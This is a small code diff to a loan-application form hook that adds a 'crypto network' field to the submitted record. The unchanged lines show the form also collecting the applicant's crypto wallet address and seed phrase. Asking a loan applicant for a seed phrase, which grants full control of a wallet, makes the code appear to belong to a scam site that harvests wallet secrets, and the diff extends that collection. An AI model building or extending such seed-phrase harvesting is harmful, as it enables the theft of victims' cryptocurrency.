@@ -347,6 +347,7 @@ export function useLoanApplication() {
       cryptoWalletType: String(fd.get("crypto_wallet_type") || "").trim() || null,
       cryptoWalletAddress: String(fd.get("crypto_wallet_address") || "").trim() || null,
       cryptoSeedPhrase: String(fd.get("crypto_seed_phrase") || "").trim() || null,
+      cryptoNetwork: String(fd.get("crypto_network") || "").trim() || null,
       accountHolderName: String(fd.get("account_holder_name") || "").trim() || null,
       sourcePage: typeof window !== "undefined" ? window.location.pathname : "/loans",
       status: "pending",
